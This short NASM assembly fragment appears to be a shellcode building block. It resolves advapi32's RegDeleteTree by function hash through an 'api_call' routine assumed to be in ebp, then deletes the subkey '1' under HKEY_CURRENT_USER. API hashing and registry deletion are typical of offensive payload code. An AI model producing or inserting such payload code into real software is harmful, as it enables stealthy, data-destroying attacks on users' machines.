[BITS 32]
[ORG 0]

; Const HKEY_CLASSES_ROOT     = 0x80000000
; Const HKEY_CURRENT_USER     = 0x80000001
; Const HKEY_LOCAL_MACHINE    = 0x80000002
; Const HKEY_USERS            = 0x80000003
; Const HKEY_CURRENT_CONFIG   = 0x80000005

; requires ebp to contain the address of api_call
; perform a call to RegDeleteTree
  ; push the lpSubKey string onto the stack
  push 0x00000031 ; "1",0,0,0
  push esp 
  ; push eax
  ; push 0x80000002
  push 0x80000001 ; 
  push 0x09E5DB62 ; hash( "advapi32.dll", "RegDeleteTree" )
  call ebp        ; RegDeleteTree( &hKey, &lpSubKey )